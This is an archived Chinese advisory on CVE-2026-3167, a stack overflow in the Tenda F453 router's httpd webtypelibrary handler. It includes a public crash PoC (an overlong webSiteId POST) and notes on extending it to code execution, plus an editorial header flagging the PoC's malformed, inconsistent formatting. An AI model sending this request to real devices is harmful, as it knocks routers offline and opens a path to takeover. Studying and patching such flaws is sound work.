---
cve: "CVE-2026-3167"
source: "gelusus/wxvl 公众号漏洞文库"
id: "vw-1110f6130d76c8e4159c9ca3"
entity_id: "ve-1110f6130d76c8e4159c9ca3"
schema_version: "1"
title: "Tenda F453路由器高危漏洞"
product: "Tenda F453 V1.0.0.3"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2026-3167"
referenced_identifiers: ""
prerequisites: "webtypelibrary webSiteId；认证未说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Tenda/Tenda%20F453%E8%B7%AF%E7%94%B1%E5%99%A8%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

#  Tenda F453路由器高危漏洞  

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Tenda F453 V1.0.0.3
- 本文讨论：CVE-2026-3167；七其他编号为相关清单
- 版本、权限与配置前提：webtypelibrary webSiteId；认证未说明
- 资料类型：栈溢出预警分析；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 整个HTTP请求黏成单行，头体无分隔；声称约400字节但正文a串明显更长且Content-Length410不一致
- 64字节栈缓冲/覆盖RA无反编译或调试证据，RCE仍推断
- 参考只给名称无URL，相关漏洞发现人可能与数据库混同
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 认证、缓冲大小、PoC来源和相关CVE列表待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->

zere
                    zere  船山信安   2026-03-02 04:15  
  
   
  
# Tenda F453路由器高危漏洞分析  
## 漏洞背景  
  
近日，**Li Tengzheng（LtzHust）**  
 披露了 **Tenda F453**  
 路由器固件版本 **V1.0.0.3**  
 中的一个高危缓冲区溢出漏洞，编号 **CVE-2026-3167**  
。该漏洞在   
httpd  
 组件的   
/goform/webtypelibrary  
 ，   
formWebTypeLibrary函数  
中，发现  
webSiteId用户参数输入时，  
缺乏长度检查，容易使远程攻击者发送特制请求让远程代码执行。  
## 漏洞详情  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">项目</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">内容</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE编号</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">CVE-2026-3167</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">厂商</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Tenda</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">产品</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">F453 路由器</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">受影响版本</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">V1.0.0.3</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">漏洞类型</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">缓冲区溢出 (CWE-120)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">受影响组件</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">httpd (Web服务器)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">漏洞文件/函数</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/webtypelibrary / formWebTypeLibrary</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">危险参数</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">webSiteId</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">攻击向量</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">远程网络请求（POST）</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">后果</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">拒绝服务 / 远程代码执行</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">利用状态</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">PoC 已公开</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">固件下载</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Tenda官方支持</span></section></td></tr></tbody></table>  


## 漏洞原理分析  
### 漏洞函数与参数  
  
在 httpd 的 formWebTypeLibrary 函数中，程序从用户POST请求中获取参数 webSiteId，然后将其复制到一个**固定大小的栈缓冲区**  
中，未做任何长度校验。如果输入长度超出缓冲区大小(64字节)，就会覆盖栈上的相邻数据，包括局部变量、帧指针和函数返回地址。  
### PoC 代码请求  
  
下面为公开的PoC请求：  
```http
POST /goform/webtypelibrary HTTP/1.1Host: 192.168.6.2X-Requested-With: XMLHttpRequestAccept-Language: en-US,en;q=0.9Accept: text/plain, */*; q=0.01User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36Referer: http://192.168.6.2/index.aspAccept-Encoding: gzip, deflate, brCookie: user=Connection: keep-aliveContent-Length: 410webSiteId=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```  
  
如果将请求发送至路由器，超长的 **webSiteId**  
 参数（约400个 **a**  
）就会被复制到栈缓冲区，导致栈溢出，即  
httpd 进程崩溃（拒绝服务）。  
## PoC 构造原理分析  
- • **POST 方法**  
：漏洞函数只响应POST请求，保证参数能通过请求体传递。  
  
- • **请求头伪装**  
：包含 X-Requested-With、Referer 等头部，使请求看起来来自合法管理页面，可能绕过简单的访问检查。  
  
- • **超长数据**  
：400个 a 超过目标缓冲区（64字节）大小，确保覆盖返回地址。  
  
- • **单一字符 a**  
：方便崩溃后通过调试确认内存被 0x61填满，验证漏洞存在。  
  
攻击者如果将 **a**  
替换自己设置的 payload，可能会控制返回地址，实现其任意代码执行。  
## 多款高危漏洞集中  
  
通过相关的收集，这些漏洞都有共同的特征：主要都是位于路由器的**httpd组件**  
中，发现的大部分漏洞类型均为**缓冲区溢出**  
（CWE-120）。  
部分代码详情，细节分析已经公开，风险程度会高一些。  
下面表格中汇总了近期相关的漏洞信息：  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">CVE 编号</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">受影响组件/函数</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">危险等级 (CVSS)</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">发现/提交者</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3165</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/AdvSetWrlsafeset 文件中的 fromSetWifiGusetBasic 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">未明确</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3166</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/RouteStatic 文件中的 fromRouteStatic 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">未明确</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3167</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/webtypelibrary 文件中的 formWebTypeLibrary 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">LtzHust</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3274</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/L7Prot 文件中的 frmL7ProtForm 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">VulDB</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3275</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/addressNat 文件中的 fromAddressNat 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">LtzHust2</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3376</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/SafeMacFilter 文件中的 fromSafeMacFilter 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">LtzHust2</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3378</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/qossetting文件中的 fromqossetting 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">LtzHust2</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #333333;font-weight: bold;font-size: inherit;"><span leaf="">CVE-2026-3379</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">/goform/SetIpBind 文件中的 fromSetIpBind 函数</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">高危</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">LtzHust2</span></section></td></tr></tbody></table>  


## 总结  
  
CVE-2026-3167 是一个典型的嵌入式设备缓冲区溢出漏洞，通过公开的 PoC，攻击者可能会导致服务崩溃，如果再结合 ROP 相关技术，可能会达到获取设备的权限。  
  
**本文仅用于安全研究和学习，请勿用于非法用途。**  
## 参考链接  
- • NVD - CVE-2026-3167  
  
- • VulDB - VDB-347674  
  
- • GitHub 分析  
  
- • Tenda 官方  
  
  
  
   
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
